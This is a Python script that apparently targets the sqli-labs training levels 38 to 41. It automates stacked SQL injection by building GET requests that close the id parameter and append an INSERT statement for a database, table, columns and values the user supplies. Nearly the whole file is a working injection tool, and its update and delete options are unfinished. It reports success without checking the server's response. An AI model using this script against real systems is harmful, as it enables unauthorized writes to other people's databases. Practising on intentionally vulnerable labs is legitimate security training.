import requests

class Less38_Less41(object):


    # Stacked injections
    def __init__(self,url,level):
        
        if url[-1] == "/":

            self.url = url

        else:

            self.url = url + "/"

        self.level = level

    def payload(self):
        pass

    def Input(self):

        self.db = input("input the database name > ")

        self.table = input("input the table name > ")

        self.column = input("input the columns name,separate by [,] > ")

        self.schema = input("input the values name,spearate by [,] > ")


        if len(self.column.split(",")) == len(self.schema.split(",")) and self.db != '' and self.table != '':

            return True

        else:

            print()
            print("something was wrong,check the same amount of the columns and values")
            print("or check the database name and table name is correct")

    def Insert(self):

        schema = []


        for each in self.schema.split(","):

            schema.append("'"+each+"'")

        self.schema = ','.join(schema)


        if self.level == 38:

            rep = requests.get(self.url+"?id=1';insert into "+self.db+"."+self.table+"("+self.column+") values("+self.schema+") --+")

        elif self.level == 39:

            rep = requests.get(self.url+"?id=1;insert into "+self.db+"."+self.table+"("+self.column+") values("+self.schema+") --+")

        elif self.level == 40:

            rep = requests.get(self.url+"?id=1');insert into "+self.db+"."+self.table+"("+self.column+") values("+self.schema+") --+")

        elif self.level == 41:

            rep = requests.get(self.url+"?id=1;insert into "+self.db+"."+self.table+"("+self.column+") values("+self.schema+") --+")

        else:

            print("need level argument")

        print("insert successful")

    def Update(self):
        pass

    def Delete(self):
        pass

    def List(self):
        print("0 insert into")
        print("1 update")
        print("2 delete")

    def TYPE(self):

        print("Stacked Injections,only need level and url arguments")

        self.List()


        self.choice = int(input("which one you gonna select?"))


        if self.choice == 0 and self.Input():

            self.Insert()

        elif self.choice == 1:

            print("coming soon")

        elif self.choice == 2:

            print("coming soon")


    def Less_38(self):
        self.TYPE()

    def Less_39(self):
        self.TYPE()

    def Less_40(self):
        self.TYPE()

    def Less_41(self):
        self.TYPE()

